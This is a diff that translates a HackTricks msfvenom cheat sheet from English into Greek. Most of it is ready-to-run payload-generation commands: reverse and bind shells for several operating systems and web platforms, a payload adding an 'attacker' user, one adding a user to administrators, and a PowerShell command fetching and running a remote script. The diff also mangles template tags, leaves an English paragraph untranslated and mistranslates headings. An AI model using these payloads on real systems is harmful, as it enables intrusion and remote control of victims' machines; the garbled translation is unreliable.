@@ -1,103 +1,107 @@
-# MSFVenom - CheatSheet
+# MSFVenom - Φύλλο απατεώνα
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Εγγραφείτε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Εισαγωγή στο Χάκινγκ**\
+Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
+Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Τελευταίες Ανακοινώσεις**\
+Μείνετε ενημερωμένοι με τις νεότερες ανταμοιβές ευρημάτων που ξεκινούν και τις κρίσιμες ενημερώσεις των πλατφορμών
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Εγγραφείτε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**
 
 ***
 
-## Basic msfvenom
+## Βασική msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-One can also use the `-a` to specify the architecture or the `--platform`
-
-## Listing
-
+Μπορείτε επίσης να χρησιμοποιήσετε το `-a` για να καθορίσετε την αρχιτεκτονική ή την `--platform`
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
+## Κοινοί παράμετροι κατά τη δημιουργία ενός shellcode
 
-## Common params when creating a shellcode
+When creating a shellcode, there are several common parameters that can be used to customize its behavior. These parameters include:
 
+- **LHOST**: Η διεύθυνση IP του επιτιθέμενου συστήματος, στο οποίο θα σταλεί ο shellcode.
+- **LPORT**: Ο αριθμός θύρας στον οποίο θα ακούει ο shellcode για συνδέσεις.
+- **EXITFUNC**: Η μέθοδος που θα χρησιμοποιηθεί για την έξοδο από το πρόγραμμα μετά την εκτέλεση του shellcode.
+- **Encoder**: Ο κωδικοποτητής που θα χρησιμοποιηθεί για την απόκρυψη του shellcode.
+- **Badchars**: Οι χαρακτήρες που πρέπει να αποφευχθούν στο shellcode, εάν υπάρχουν.
+- **Platform**: Η πλατφόρμα στην οποία θα εκτελεστεί το shellcode (π.χ. Windows, Linux, macOS).
+- **Arch**: Η αρχιτεκτονική του συστήματος στο οποίο θα εκτελεστεί το shellcode (π.χ. x86, x64, ARM).
+
+Αυτές οι παράμετροι μπορούν να προσαρμοστούν ανάλογα με τις ανάγκες της επίθεσης και το περιβάλλον στο οποίο θα εκτελεστεί το shellcode.
 ```bash
--b "\x00\x0a\x0d" 
--f c 
--e x86/shikata_ga_nai -i 5 
+-b "\x00\x0a\x0d"
+-f c
+-e x86/shikata_ga_nai -i 5
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-
 ## **Windows**
 
-### **Reverse Shell**
+### **Αντίστροφο Shell**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
-{% endcode %}
-
-### Bind Shell
+### Συνδεδεμένη θύρα (Bind Shell)
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-{% endcode %}
-
-### Create User
-
 {% code overflow="wrap" %}
+
+### Δημιουργία Χρήστη
+
+{% code %}
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-{% endcode %}
+{% code overflow="wrap" %}
 
 ### CMD Shell
 
-{% code overflow="wrap" %}
+{% code %}
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-{% endcode %}
-
-### **Execute Command**
-
 {% code overflow="wrap" %}
+
+### **Εκτέλεση Εντολής**
+
+{% endcode %}
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
 {% endcode %}
 
-### Encoder
+### Κωδικοποιητής
 
 {% code overflow="wrap" %}
 ```bash
@@ -105,7 +109,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > enco
 ```
 {% endcode %}
 
-### Embedded inside executable
+### Ενσωματωμένο μέσα σε εκτελέσιμο
 
 {% code overflow="wrap" %}
 ```bash
@@ -113,18 +117,16 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 ```
 {% endcode %}
 
-## Linux Payloads
+## Πληρωμές Linux
 
-### Reverse Shell
+### Αντίστροφο κέλυφος
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```
-{% endcode %}
-
-### Bind Shell
+### Συνδεδεμένη θύρα (Bind Shell)
 
 {% code overflow="wrap" %}
 ```bash
@@ -140,17 +142,15 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```
 {% endcode %}
 
-## **MAC Payloads**
+## **MAC Παραμέτροι**
 
-### **Reverse Shell:**
+### **Αντίστροφο Shell:**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
-{% endcode %}
-
-### **Bind Shell**
+### **Συνδεδεμένη θύρα**
 
 {% code overflow="wrap" %}
 ```bash
@@ -158,11 +158,11 @@ msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho
 ```
 {% endcode %}
 
-## **Web Based Payloads**
+## **Πλατφόρμες βασισμένες στον ιστό**
 
 ### **PHP**
 
-#### Reverse shel**l**
+#### Αντίστροφη κέλυφος
 
 {% code overflow="wrap" %}
 ```bash
@@ -173,7 +173,7 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 
 ### ASP/x
 
-#### Reverse shell
+#### Αντίστροφο κέλυφος
 
 {% code overflow="wrap" %}
 ```bash
@@ -184,7 +184,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 
 ### JSP
 
-#### Reverse shell
+#### Αντίστροφο κέλυφος
 
 {% code overflow="wrap" %}
 ```bash
@@ -194,21 +194,19 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f r
 
 ### WAR
 
-#### Reverse Shell
+#### Αντίστροφος Shell
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
 ```
-{% endcode %}
+{% code %}
 
 ### NodeJS
-
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-
-## **Script Language payloads**
+## **Φορτία γλωσσών σεναρίου**
 
 ### **Perl**
 
@@ -216,11 +214,11 @@ msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
 ```
-{% endcode %}
+{% code overflow="wrap" %}
 
 ### **Python**
 
-{% code overflow="wrap" %}
+{% endcode %}
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
@@ -236,29 +234,29 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Συμμετέχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Εισαγωγή στο Hacking**\
+Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ.
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
+Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο.
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Τελευταίες Ανακοινώσεις**\
+Μείνετε ενημερωμένοι με τις νεότερες ευκαιρίες ευρήματος ασφαλείας και τις κρίσιμες ενημερώσεις των πλατφορμών.
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Συμμετέχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) **και** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **αποθετήρια του github.**
 
 </details>
